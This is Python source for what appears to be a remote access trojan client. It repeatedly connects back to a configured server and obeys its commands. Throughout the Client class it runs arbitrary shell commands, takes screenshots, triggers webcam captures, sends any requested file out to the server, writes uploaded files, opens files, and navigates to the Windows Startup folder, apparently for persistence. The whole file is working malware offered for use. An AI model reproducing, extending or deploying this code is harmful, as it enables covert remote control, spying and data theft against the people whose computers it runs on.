import sys
import socket
from time import sleep
import webbrowser
import os
from threading import Thread
import subprocess
import getpass
try:
    from PIL import ImageGrab
except ImportError:
    pass


class Client:
    def __init__(self, server_ip=None, port=None, name="pc"):
        self.name = name
        self.server_ip = server_ip
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.data_path = "data.txt"

        self.system = sys.platform

        if server_ip is None and port is None:
            self.check_file()

    def check_file(self):
        if os.path.exists(self.data_path) and os.path.isfile(self.data_path):
            with open(self.data_path, "r") as f:
                data = f.read()
                self.name, self.server_ip, self.port = data.split("-")

    def run(self):
        while True:
            try:
                sleep(1)
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((self.server_ip, int(self.port)))
                self.s.send(self.name.encode("UTF-8"))
                break

            except:
                continue

        while True:

            try:
                command = self.s.recv(1024).decode("UTF-8")

                if command == "check":
                    self.s.send("connection established".encode("UTF-8"))

                elif command == "get name":
                    self.s.send(self.name.encode("UTF-8"))

                elif command == "path mode":
                    path = os.getcwd().encode("utf-8")
                    self.s.send(path)

                elif command == "startup path":
                	username = getpass.getuser()
                	startup_path = "C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/StartUp".format(username)
                	if os.path.exists(startup_path):
                		os.chdir(startup_path)
                		self.s.send(os.getcwd().encode("UTF-8"))
                	else:
                		self.s.send(os.getcwd().encode("UTF-8"))

                elif command.startswith("cd "):
                    try:
                        os.chdir(command[3:])
                        self.s.send(os.getcwd().encode("UTF-8"))

                    except OSError:
                        self.s.send(os.getcwd().encode("UTF-8"))

                elif command.startswith("dir"):
                    self.send_output(command)

                elif command.startswith("web "):
                    webbrowser.open(command[4:])

                elif command == "screenshot":
                    if "linux" not in self.system:
                        screenshot_name = "screenshot.jpg"
                        ImageGrab.grab().save(screenshot_name)
                        with open(screenshot_name, "rb") as f:
                            data = f.read()
                        self.s.send(data)
                        self.s.send("end".encode("utf-8"))
                        os.remove(screenshot_name)
                    else:
                        self.s.send("error".encode("utf-8"))

                elif command == "webcam":
                    if os.path.exists("webcam_shot.pyw"):
                        #os.system("start webcam_shot.pyw")
                        os.startfile("webcam_shot.pyw")
                        self.s.send("Taking webcam shot.".encode("utf-8"))
                    else:
                        self.s.send("File to take webcam shots doesn't exist.".encode("utf-8"))

                elif command.startswith("read "):
                    file = command.split()[1]
                    if os.path.exists(file) and os.path.isfile(file):
                        self.s.send("ok".encode("utf-8"))
                        with open(file, "rb") as f:
                            data = f.read()
                        self.s.send(data)
                        self.s.send("end".encode("utf-8"))
                    else:
                        self.s.send("error".encode("utf-8"))

                elif command.startswith("send "):
                    file_name = command.split()[1]
                    file_data = b""
                    while True:
                        data = self.s.recv(1024)
                        file_data += data
                        if data.endswith(b"end"):
                            break
                    with open(file_name, "wb") as f:
                        f.write(file_data[:len(file_data) - 3])
                    self.s.send("File has been written.".encode("utf-8"))

                elif command.startswith("start "):
                    file = command.split()[1]
                    if os.path.exists(file) and len(file) > 0:
                        os.startfile(file)
                        self.s.send("File has been opened.".encode("utf-8"))
                    else:
                        self.s.send("File doesn't exist.".encode("utf-8"))

                elif command == "close" or command == "reset":
                    self.s.close()
                    break

                else:
                    self.send_output(command)

            except:
                break

        sleep(1)
        Thread(target=self.run).start()

    def send_output(self, command):
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = process.stdout.read() + process.stderr.read()
        self.s.send(output)
        self.s.send("end".encode("utf-8"))


if __name__ == '__main__':
    name = ""
    ip = ""
    port = 6000
    client = Client(ip, port, name)
    client.run()


